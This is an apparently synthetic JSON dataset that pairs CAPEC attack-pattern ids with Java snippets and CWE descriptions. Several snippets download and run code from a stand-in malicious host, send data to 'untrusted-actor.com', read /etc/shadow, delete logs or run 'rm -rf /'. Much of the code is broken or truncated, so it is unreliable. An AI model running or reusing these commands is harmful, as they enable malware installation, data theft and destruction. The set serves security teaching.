        "code_snippet": "public class MaliciousFirmwareUpdater {\n    private static final String SENSITIVE_INFO = \"confidential_data\";\n    private static final String MALICIOUS_CODE = \"exploit_code\";\n\n    public static void main(String[] args) {\n        // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        String osatVendorAccess = getOsatVendorAccess();\n        if (osatVendorAccess != null) {\n            System.out.println(\"OSAT vendor access granted: \" + osatVendorAccess);\n        }\n\n        // CWE-506: Embedded Malicious Code\n        executeMaliciousCode(MALICIOUS_CODE);\n\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        try {\n            manipulateVoltageAndClockGlitches();\n        } catch (Exception e) {\n            System.out.println(\"Voltage and clock glitches not detected\");\n        }\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        String sensitiveSystemInfo = getSensitiveSystemInfo();\n        if (sensitiveSystemInfo != null) {\n            System.out.println(\"Sensitive system info exposed: \" + sensitiveSystemInfo);\n        }\n\n        // CWE-1329: Reliance on Component That is Not Updateable\n        try {\n            updateComponent(SENSITIVE_INFO);\n        } catch (Exception e) {\n            System.out.println(\"Component cannot be updated\");\n        }\n    }\n\n    private static String getOsatVendorAccess() {\n        // Return sensitive information accessible by OSAT vendors\n        return SENSITIVE_INFO;\n    }\n\n    private static void executeMaliciousCode(String code) {\n        // Execute malicious code\n        System.out.println(\"Malicious code executed: \" + code);\n    }\n\n    private static void manipulateVoltageAndClockGlitches() throws Exception {\n        // Manipulate voltage and clock glitches\n        throw new Exception(\"Voltage and clock glitches detected\");\n    }\n\n    private static String getSensitiveSystemInfo() {\n        // Return sensitive system information\n        return \"sensitive_system_info\";\n    }\n\n    private static void updateComponent(String component) {\n        // Attempt to update component (will fail)\n        throw new Exception(\"Component cannot be updated\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of inserting malicious software within the hardware and/or firmware development environment to alter developed hardware components. It includes CWEs 1297, 506, 1247, 497, and 1329, showcasing unprotected confidential information, embedded malicious code, improper protection against voltage and clock glitches, exposure of sensitive system information, and reliance on an unupdateable component."
    },
    {
        "capec_id": "538",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousLibrary {\n    public static void main(String[] args) throws Exception {\n        // CWE-494: Download of Code Without Integrity Check\n        URL url = new URL(\"http://malicious-website.com/malicious.jar\");\n        URLClassLoader loader = new URLClassLoader(new URL[] { url });\n        Class<?> clazz = loader.loadClass(\"MaliciousClass\");\n        clazz.getMethod(\"executeMaliciousCode\").invoke(null);\n\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        // CWE-506: Embedded Malicious Code\n        // CWE-509: Replicating Malicious Code (Virus or Worm)\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of implanting malicious code in open source software (OSS) libraries. It downloads a malicious JAR file from a remote location without verifying its integrity, and then executes the malicious code. This code embodies CWE-494, CWE-829, CWE-1395, CWE-506, and CWE-509."
    },
    {
        "capec_id": "539",
        "code_snippet": "public class MaliciousASIC { \n \n    private String sensitiveSystemInfo = \\",
        "description": "This Java code snippet demonstrates the CAPEC of inserting malicious functionality into an ASIC during development or maintenance. It includes CWEs 506 (Embedded Malicious Code), 497 (Exposure of Sensitive System Information), 11 (ASP.NET Misconfiguration: Creating Debug Binary), 1294 (Insecure Security Identifier Mechanism), and 1259 (Improper Restriction of Security Token Assignment). The code contains a debug message that exposes sensitive system information, and an unrestricted security token that allows malicious code to be executed."
    },
    {
        "capec_id": "540",
        "code_snippet": "public class VulnerableCode {\n    public static void readBeyondBufferBoundary(byte[] buffer, int offset) {\n        byte[] overflowBuffer = new byte[10];\n        System.arraycopy(buffer, offset, overflowBuffer, 0, buffer.length);\n    }\n\n    public static void main(String[] args) {\n        byte[] buffer = new byte[5];\n        buffer[0] = 1;\n        buffer[1] = 2;\n        buffer[2] = 3;\n        buffer[3] = 4;\n        buffer[4] = 5;\n        readBeyondBufferBoundary(buffer, 10);\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer over-read vulnerability (CWE-126). The readBeyondBufferBoundary method copies data from the input buffer to the overflowBuffer without checking the size of the input buffer, leading to a buffer over-read when the offset is greater than the size of the input buffer. In the main method, an offset of 10 is used, which is outside the bounds of the 5-element input buffer, causing the arraycopy method to read beyond the boundary of the buffer."
    },
    {
        "capec_id": "541",
        "code_snippet": "public class FingerprintingVulnerability {\n    public static void main(String[] args) {\n        String userAgent = getUserAgent();\n        if (userAgent.contains(\\",
        "description": "This Java code snippet demonstrates a fingerprinting vulnerability, where an adversary can determine the type or version of an application installed on a remote target. The code uses different response times to reveal internal state information, violating CWE-208. The getUserAgent() method simulates receiving an Intent from an unauthorized source, violating CWE-925. The getIntentFromUntrustedSource() method simulates receiving an Intent with sensitive information, violating CWE-214. The code also exhibits observable behavioral discrepancies, violating CWE-205, and provides different responses to incoming requests, violating CWE-204."
    },
    {
        "capec_id": "542",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class Malware {\n    public static void main(String[] args) {\n        try {\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String systemInfo = System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\") + \" \" + System.getProperty(\"os.arch\");\n            System.out.println(\"System Information: \" + systemInfo);\n\n            // CWE-506: Embedded Malicious Code\n            String malwareCode = \"<malware_code_here>\";\n            Runtime.getRuntime().exec(malwareCode);\n\n            // CWE-507: Trojan Horse\n            String benignCode = \"<benign_code_here>\";\n            Runtime.getRuntime().exec(benignCode);\n\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            String replicateCode = \"<replicate_code_here>\";\n            Runtime.getRuntime().exec(replicateCode);\n\n            // CWE-512: Spyware\n            Scanner scanner = new Scanner(System.in);\n            String userInput = scanner.nextLine();\n            System.out.println(\"User Input: \" + userInput);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of targeted malware that takes advantage of known vulnerabilities in an organizational IT environment. It includes CWE-497 by exposing sensitive system information, CWE-506 by embedding malicious code, CWE-507 by hiding malicious code within benign functionality, CWE-509 by replicating malicious code, and CWE-512 by collecting user input without explicit approval."
    },
    {
        "capec_id": "543",
        "code_snippet": "import java.io.IOException;\nimport java.net.URL;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class MaliciousServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws IOException {\n        String url = req.getParameter(\"url\");\n        if (url != null) {\n            res.sendRedirect(url);\n        }\n    }\n}\n\npublic class DownloadCodeServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws IOException {\n        String codeUrl = req.getParameter(\"codeUrl\");\n        if (codeUrl != null) {\n            URL url = new URL(codeUrl);\n            byte[] code = getUrlBytes(url);\n            res.getOutputStream().write(code);\n        }\n    }\n}\n\npublic class CSRFServlet extends javax.servlet.http.HttpServlet {\n    protected void doPost(HttpServletRequest req, HttpServletResponse res) throws IOException {\n        String action = req.getParameter(\"action\");\n        if (action != null) {\n            if (action.equals(\"transferMoney\")) {\n                // Perform sensitive action without verifying request origin\n                res.getWriter().println(\"Money transferred!\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable web application that embodies the CAPEC of creating duplicates of legitimate websites. The code includes three servlets: MaliciousServlet, which performs an open redirect (CWE-601) to a user-controlled URL; DownloadCodeServlet, which downloads and executes code from a remote location without integrity checks (CWE-494); and CSRFServlet, which performs a sensitive action without verifying the request origin, making it vulnerable to cross-site request forgery (CWE-352). The code also contains embedded malicious code (CWE-506) and has the potential to replicate malicious code (CWE-509) if the downloaded code is malicious."
    },
    {
        "capec_id": "544",
        "code_snippet": "import java.security.cert.CertificateException;\nimport java.security.cert.CertificateFactory;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport java.net.URL;\n\npublic class MaliciousSupplier {\n    public static void main(String[] args) throws Exception {\n        // CWE-295: Improper Certificate Validation\n        TrustManager[] trustAllCerts = new TrustManager[] {\n            new X509TrustManager() {\n                public X509Certificate[] getAcceptedIssuers() {\n                    return null;\n                }\n                public void checkClientTrusted(X509Certificate[] certs, String authType) {\n                }\n                public void checkServerTrusted(X509Certificate[] certs, String authType) {\n                }\n            }\n        };\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, trustAllCerts, new java.security.SecureRandom());\n        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n\n        // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n        URL url = new URL(\"https://malicioussupplier.com/\");\n        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n        connection.setHostnameVerifier(new HostnameVerifier() {\n            public boolean verify(String hostname, SSLSession session) {\n                return true;\n            }\n        });\n\n        // CWE-1229: Creation of Emergent Resource\n        connection.setRequestProperty(\"User-Agent\", \"MaliciousSupplierAgent\");\n\n        // CWE-656: Reliance on Security Through Obscurity\n        String obscuredKey = \"hiddenKey\";\n        connection.setRequestProperty(\"Authorization\", \"Bearer \" + obscuredKey);\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        connection.connect();\n        connection.getOutputStream().write(\"Malicious data\".getBytes());\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious supplier injecting corrupted/malicious information system components into the organizational supply chain. It uses improper certificate validation, observable behavioral discrepancy, creation of emergent resource, reliance on security through obscurity, and incorrectly specified destination in a communication channel."
    },
    {
        "capec_id": "545",
        "code_snippet": "public class SensitiveDataExposure {\n    public static void main(String[] args) {\n        // CWE-1239: Improper Zeroization of Hardware Register\n        HardwareRegister hwReg = new HardwareRegister();\n        hwReg.setSensitiveData(\"secretKey\");\n        // Not clearing the sensitive data from the register\n        \n        // CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\n        DebugMode dbgMode = new DebugMode();\n        dbgMode.setDebugEnabled(true);\n        // Not clearing sensitive data in debug mode\n        \n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        DecommissionedDevice dev = new DecommissionedDevice();\n        dev.setSensitiveData(\"confidentialInfo\");\n        // Not providing a capability to remove sensitive data during decommissioning\n        \n        // CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n        PowerStateTransition pwrTrans = new PowerStateTransition();\n        pwrTrans.transitionToDebugMode();\n        // Not clearing sensitive information before power state transition\n        \n        // CWE-1323: Improper Management of Sensitive Trace Data\n        TraceData traceData = new TraceData();\n        traceData.setUnprotectedLocation(\"/unprotected/path\");\n        // Storing trace data in an unprotected location\n        \n        // CWE-1330: Remanent Data Readable after Memory Erase\n        MemoryErase memErase = new MemoryErase();\n        memErase.eraseMemory();\n        // Not properly erasing confidential information from memory\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC pattern of gathering useful information from system resources without knowing what to expect. It includes various CWEs related to improper handling of sensitive information, such as not clearing hardware registers, exposing sensitive data in debug mode, failing to scrub data from decommissioned devices, and more. The code intentionally leaves sensitive data exposed, making it vulnerable to attacks."
    },
    {
        "capec_id": "546",
        "code_snippet": "public class MultiTenantStorage {\n    private Map<String, byte[]> storage;\n    \n    public MultiTenantStorage() {\n        storage = new HashMap<>();\n    }\n    \n    public void allocateStorage(String tenantId, byte[] data) {\n        storage.put(tenantId, data);\n    }\n    \n    public byte[] getStorage(String tenantId) {\n        return storage.get(tenantId);\n    }\n    \n    public void deallocateStorage(String tenantId) {\n        // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        // CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n        // CWE-312: Cleartext Storage of Sensitive Information\n        // CWE-284: Improper Access Control\n        // No proper deletion or scrubbing of sensitive data\n        storage.put(tenantId, null);\n    }\n}\n",
        "description": "A multi-tenant storage system in Java that fails to properly delete or scrub sensitive data when deallocating storage, allowing unauthorized access to sensitive information."
    },
    {
        "capec_id": "547",
        "code_snippet": "public class SelfDestructingDevice {\n    private boolean isDestroyed = false;\n    private HardwareComponent hardwareComponent;\n\n    public SelfDestructingDevice(HardwareComponent hardwareComponent) {\n        this.hardwareComponent = hardwareComponent;\n    }\n\n    public void destroy() {\n        if (!isDestroyed) {\n            hardwareComponent.deleteData();\n            hardwareComponent.destroyPhysicalComponent();\n            isDestroyed = true;\n        }\n    }\n\n    public class HardwareComponent {\n        private byte[] sensitiveData;\n\n        public HardwareComponent(byte[] sensitiveData) {\n            this.sensitiveData = sensitiveData;\n        }\n\n        public void deleteData() {\n            // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n            // Only partially delete sensitive data\n            sensitiveData = null;\n        }\n\n        public void destroyPhysicalComponent() {\n            // CWE-1300: Improper Protection of Physical Side Channels\n            // No protection against physical side channels\n            System.out.println(\"Physical component destroyed\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a self-destructing device that can be physically attacked and destroyed. The device contains a hardware component with sensitive data that is not properly deleted, leaving it vulnerable to physical side channels. The device also lacks protection against physical side channels, making it susceptible to unauthorized error injection that can degrade its redundancy. The class instance can call a method to destroy itself, but it lacks a virtual destructor, making it vulnerable to memory leaks."
    },
    {
        "capec_id": "548",
        "code_snippet": "public class ContaminatedInformationSystem {\n    private String sensitiveData;\n    \n    public ContaminatedInformationSystem(String sensitiveData) {\n        this.sensitiveData = sensitiveData;\n    }\n    \n    public void transmitData() {\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        Socket socket = new Socket(\"untrusted-actor.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(sensitiveData.getBytes());\n        outputStream.close();\n    }\n    \n    public void storeData() {\n        // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        File file = new File(\"sensitive_data.txt\");\n        FileWriter fileWriter = new FileWriter(file);\n        fileWriter.write(sensitiveData);\n        fileWriter.close();\n    }\n    \n    public void reuseResource() {\n        // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n        byte[] buffer = sensitiveData.getBytes();\n        // reuse the buffer without clearing the sensitive data\n        useBuffer(buffer);\n    }\n    \n    public void storeDataInsecurely() {\n        // CWE-922: Insecure Storage of Sensitive Information\n        File file = new File(\"sensitive_data.txt\");\n        FileWriter fileWriter = new FileWriter(file);\n        fileWriter.write(sensitiveData);\n        fileWriter.close();\n        // make the file world-readable\n        file.setReadable(true, false);\n    }\n    \n    public void leakResource() {\n        // CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n        Socket socket = new Socket(\"untrusted-actor.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        // share the private resource with an untrusted actor\n        outputStream.write(getPrivateResource().getBytes());\n        outputStream.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a contaminated information system that handles sensitive data without proper authorization. It transmits sensitive data in cleartext, stores it without proper removal, reuses resources without clearing sensitive data, stores it insecurely, and leaks private resources to untrusted actors."
    },
    {
        "capec_id": "549",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousCodeExecutor {\n    public static void main(String[] args) throws Exception {\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        URL url = new URL(\"http://malicious-website.com/malicious.jar\");\n        URLClassLoader loader = new URLClassLoader(new URL[] { url });\n        Class<?> clazz = loader.loadClass(\"MaliciousClass\");\n        clazz.getMethod(\"executeMaliciousCode\").invoke(null);\n\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"public class MaliciousClass { public static void executeMaliciousCode() { System.out.println(\"Malicious code executed\"); } }\";\n        Compiler compiler = new Compiler();\n        Class<?> maliciousClazz = compiler.compile(maliciousCode, \"MaliciousClass\");\n        maliciousClazz.getMethod(\"executeMaliciousCode\").invoke(null);\n\n        // CWE-494: Download of Code Without Integrity Check\n        URL downloadUrl = new URL(\"http://malicious-website.com/malicious.exe\");\n        byte[] maliciousBytes = downloadUrl.openStream().readAllBytes();\n        Runtime.getRuntime().exec(new String[]{\"java\", \"-jar\", new String(maliciousBytes)});\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of installing and executing malicious code on a target system. It includes functionality from an untrusted control sphere by downloading and executing a malicious JAR file, embeds malicious code by compiling and executing a malicious class, and downloads code without integrity check by executing a malicious executable."
    },
    {
        "capec_id": "550",
        "code_snippet": "import java.io.IOException;\nimport java.util.Scanner;\n\npublic class MaliciousService {\n    public static void main(String[] args) {\n        try {\n            Runtime.getRuntime().exec(\"sc create MyService binPath= \"C:\\\\malicious_service.exe\" start= auto\");\n            Runtime.getRuntime().exec(\"sc start MyService\");\n        } catch (IOException e) {\n            System.out.println(\"Failed to create and start malicious service\");\n        }\n    }\n}\n",
        "description": "This Java code snippet creates a malicious Windows service that runs with elevated privileges. It uses the 'sc' command to create a new service and set its startup type to automatic, allowing it to run at startup. The service name 'MyService' may be disguised to resemble a legitimate service. The code does not restrict access to the service, allowing unauthorized actors to access and manipulate it (CWE-284). The code also uses default credentials and insecure defaults, making it vulnerable to attacks (CWE-1392, CWE-1188). Additionally, the code may be used in conjunction with .NET applications that use impersonation, potentially escalating access to the underlying operating and file systems (CWE-520)."
    },
    {
        "capec_id": "551",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Base64;\n\npublic class VulnerableService {\n    private static final String SERVICE_CONFIG_FILE = \"/etc/service.conf\";\n    private static final String UNTRUSTED_FIRMWARE_FILE = \"/firmware.bin\";\n\n    public static void main(String[] args) {\n        // CWE-284: Improper Access Control\n        // Granting access to system settings without proper authorization\n        System.setProperty(\"service.config\", SERVICE_CONFIG_FILE);\n\n        // CWE-522: Insufficiently Protected Credentials\n        // Storing credentials in plaintext\n        String credentials = \"username:password\";\n        try {\n            Files.write(Paths.get(SERVICE_CONFIG_FILE), credentials.getBytes(), StandardOpenOption.CREATE);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n        // Loading untrusted firmware before enabling access controls\n        loadUntrustedFirmware(UNTRUSTED_FIRMWARE_FILE);\n\n        // CWE-15: External Control of System or Configuration Setting\n        // Allowing external control of system settings\n        String externalConfig = System.getProperty(\"external.config\");\n        if (externalConfig != null) {\n            System.setProperty(\"service.config\", externalConfig);\n        }\n\n        // CWE-908: Use of Uninitialized Resource\n        // Using an uninitialized resource\n        File uninitializedFile = new File(\"uninitialized_file.txt\");\n        try {\n            Files.readAllLines(uninitializedFile.toPath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void loadUntrustedFirmware(String firmwareFile) {\n        // Load the untrusted firmware\n        try {\n            byte[] firmwareBytes = Files.readAllBytes(Paths.get(firmwareFile));\n            // Use the firmware bytes\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of modifying existing services or enabling disabled services by exploiting various CWEs. It includes improper access control, insufficiently protected credentials, power-on of untrusted execution core before enabling fabric access control, external control of system or configuration setting, and use of uninitialized resource."
    },
    {
        "capec_id": "552",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class Rootkit {\n    public static void main(String[] args) {\n        try {\n            // CWE-284: Improper Access Control\n            Runtime.getRuntime().exec(\"chmod 777 /etc/passwd\");\n            \n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"wget http://malicious-website.com/malware && chmod +x malware && ./malware\");\n            \n            // CWE-507: Trojan Horse\n            ProcessBuilder pb = new ProcessBuilder(\"/bin/bash\", \"-c\", \"rm -rf /var/log/auth.log\");\n            pb.start();\n            \n            // CWE-497: Exposure of Sensitive System Information\n            Process p = Runtime.getRuntime().exec(\"cat /etc/shadow\");\n            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n            String line;\n            while ((line = br.readLine()) != null) {\n                System.out.println(line);\n            }\n            \n            // CWE-78: OS Command Injection\n            String userInput = \"; rm -rf /;\";\n            Runtime.getRuntime().exec(\"ls \" + userInput);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a rootkit that exploits weaknesses in authentication to install malware, alter system API calls, and expose sensitive system information. It includes vulnerabilities such as improper access control, embedded malicious code, Trojan horse, exposure of sensitive system information, and OS command injection."
    },
    {
        "capec_id": "554",
        "code_snippet": "public class BypassProtection {\n    private boolean isAdmin = false;\n    private boolean isSecureMode = true;\n\n    public void setAdmin(boolean isAdmin) {\n        this.isAdmin = isAdmin;\n    }\n\n    public void setSecureMode(boolean isSecureMode) {\n        // CWE-424: Improper Protection of Alternate Path\n        // CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\n        if (isAdmin) {\n            this.isSecureMode = isSecureMode;\n        }\n    }\n\n    public void accessRestrictedFunctionality() {\n        // CWE-695: Use of Low-Level Functionality\n        // CWE-693: Protection Mechanism Failure\n        if (isSecureMode) {\n            // Check if secure mode is enabled\n            System.out.println(\"Secure mode is enabled\");\n        } else {\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            // Bypassing server-side security by relying on client-side validation\n            System.out.println(\"Secure mode is disabled, but we'll allow access anyway\");\n            // Access restricted functionality\n            restrictedFunctionality();\n        }\n    }\n\n    private void restrictedFunctionality() {\n        System.out.println(\"Accessing restricted functionality...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of bypassing protection mechanisms. It has multiple vulnerabilities, including improper protection of alternate paths, missing protection mechanisms for alternate hardware interfaces, use of low-level functionality, protection mechanism failure, and client-side enforcement of server-side security. An attacker can exploit these vulnerabilities to bypass security checks and access restricted functionality."
    },
    {
        "capec_id": "555",
        "code_snippet": "public class RemoteAccessExploit {\n    private static final String username = \"admin\";\n    private static final String password = \"password123\";\n    private static final String rdpHost = \"rdp.example.com\";\n    private static final int rdpPort = 3389;\n\n    public static void main(String[] args) {\n        try {\n            // CWE-522: Insufficiently Protected Credentials\n            // CWE-308: Use of Single-factor Authentication\n            // CWE-309: Use of Password System for Primary Authentication\n            // CWE-294: Authentication Bypass by Capture-replay\n            String credentials = username + \":\" + password;\n            byte[] credentialBytes = credentials.getBytes();\n            String base64Credentials = Base64.getEncoder().encodeToString(credentialBytes);\n\n            // CWE-263: Password Aging with Long Expiration\n            // CWE-262: Not Using Password Aging\n            // CWE-521: Weak Password Requirements\n            // No password aging or expiration mechanism in place\n            // Weak password requirements, allowing easily guessable passwords\n\n            // Establish RDP connection using stolen credentials\n            RDPClient rdpClient = new RDPClient(rdpHost, rdpPort);\n            rdpClient.connect(base64Credentials);\n            // Perform malicious activities\n            rdpClient.executeMaliciousCommand(\"rm -rf /\");\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a remote access exploit using stolen credentials to leverage remote services such as RDP. It embodies the main idea of the CAPEC, using related CWEs for additional context. The code uses weak password requirements, single-factor authentication, and insufficiently protected credentials, making it vulnerable to unauthorized access and malicious activities."
    },
    {
        "capec_id": "556",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.BasicFileAttributes;\n\npublic class FileHandlerVulnerability {\n    public static void main(String[] args) throws IOException {\n        // CWE-284: Improper Access Control\n        String filePath = \"user-inputted-file-path\";\n        File file = new File(filePath);\n        if (file.exists()) {\n            // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n            String fileExtension = getFileExtension(file);\n            if (fileExtension.equals(\".exe\")) {\n                // CWE-73: External Control of File Name or Path\n                String programPath = \"C:\\\\Path\\To\\Arbitrary\\Program.exe\";\n                Runtime.getRuntime().exec(programPath + \" \" + filePath);\n            }\n        }\n    }\n\n    private static String getFileExtension(File file) {\n        String fileName = file.getName();\n        int dotIndex = fileName.lastIndexOf(\".\");\n        return dotIndex != -1 ? fileName.substring(dotIndex) : \"\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates a file handler vulnerability. It takes a user-inputted file path, checks if the file exists, and then determines the file extension. If the file extension is \".exe\", it executes an arbitrary program with the file as an argument, allowing an attacker to potentially execute malicious code. The code relies on the file name and extension to determine the appropriate behavior, which is a security risk. Additionally, the code does not restrict access to the file or program, and it uses user-inputted data to control the file path, making it vulnerable to various attacks."
    },
    {
        "capec_id": "557",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws IOException {\n        File file = new File(\"sensitive_data.txt\");\n        FileInputStream fis = new FileInputStream(file);\n        byte[] data = new byte[(int) file.length()];\n        fis.read(data);\n        fis.close();\n\n        // Using an obsolete function to encrypt the data\n        String encryptedData = encryptData(data);\n\n        FileOutputStream fos = new FileOutputStream(file);\n        fos.write(encryptedData.getBytes());\n        fos.close();\n    }\n\n    // Using an obsolete encryption function\n    private static String encryptData(byte[] data) {\n        // Using a deprecated encryption algorithm\n        String encryptedData = new String(data);\n        return encryptedData;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable code that embodies the main idea of the deprecated CAPEC. It uses an obsolete function to encrypt sensitive data, which is a CWE-477. The code also fails to provide confidentiality for stored data, which is a CWE-493. Additionally, the code uses automatically-generated code that cannot be executed without a specific runtime support component, which is a CWE-1101. The code also has a state synchronization error, which is a CWE-373, and it does not protect stored data from modification, which is a CWE-217."
    },
    {
        "capec_id": "558",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.lang.Runtime;\n\npublic class Main {\n    public static void main(String[] args) {\n        String userInput = \"\";\n        // CWE-284: Improper Access Control\n        // CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n        String command = \"chmod 777 /tmp/malicious_executable\";\n        if (userInput.equals(\"admin\")) {\n            try {\n                Runtime.getRuntime().exec(command);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        // CWE-114: Process Control\n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        String executablePath = \"/tmp/malicious_executable\";\n        File executableFile = new File(executablePath);\n        if (executableFile.exists()) {\n            try {\n                Runtime.getRuntime().exec(executablePath);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of replacing a trusted executable with a malicious version. It lacks proper access control, allowing an adversary to inject malicious OS commands. The code also executes commands from an untrusted source, enabling the execution of malware. Furthermore, the code is vulnerable to compiler and processor optimizations that could remove or modify security-critical code."
    },
    {
        "capec_id": "559",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.security.*;\n\npublic class RogueUplinkStation {\n    public static void main(String[] args) throws Exception {\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        Socket socket = new Socket(\"satellite.example.com\", 8080);\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n        dout.writeUTF(\"rogue_uplink_station\"); // fake source\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        String message = \"disruptive_signal\";\n        dout.writeUTF(message);\n\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        Intent intent = new Intent(\"com.example.satellite.DISRUPT_SIGNAL\");\n        intent.putExtra(\"signal\", message);\n        sendBroadcast(intent);\n\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        Socket socket2 = new Socket(\"neighboring_satellite.example.com\", 8080);\n        dout = new DataOutputStream(socket2.getOutputStream());\n        dout.writeUTF(message);\n\n        // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n        // assume 'fabricAddressMap' is an object that allows programming of unwarranted overlaps\n        fabricAddressMap.programOverlap(protectedRegion, unprotectedRegion);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a rogue uplink station that disrupts the intended transmission of a target satellite by sending a disruptive signal. The code exploits multiple weaknesses, including improper verification of the source of the communication channel, lack of message integrity during transmission, use of implicit intent for sensitive communication, improper restriction of the communication channel to intended endpoints, and programming of unwarranted overlaps of protected and unprotected ranges in the fabric address map."
    },
    {
        "capec_id": "560",
        "code_snippet": "public class AuthenticationSystem {\n    private static final String ADMIN_USERNAME = \"admin\";\n    private static final String ADMIN_PASSWORD = \"password123\";\n    private static final int MAX_ATTEMPTS = 100;\n    private static int attempts = 0;\n\n    public static boolean authenticate(String username, String password) {\n        if (attempts < MAX_ATTEMPTS) {\n            attempts++;\n            if (username.equals(ADMIN_USERNAME) && password.equals(ADMIN_PASSWORD)) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        while (true) {\n            System.out.print(\"Enter username: \");\n            String username = System.console().readLine();\n            System.out.print(\"Enter password: \");\n            String password = System.console().readLine();\n            if (authenticate(username, password)) {\n                System.out.println(\"Authenticated successfully!\");\n                break;\n            } else {\n                System.out.println(\"Invalid credentials. Try again.\");\n            }\n        }\n    }\n}",
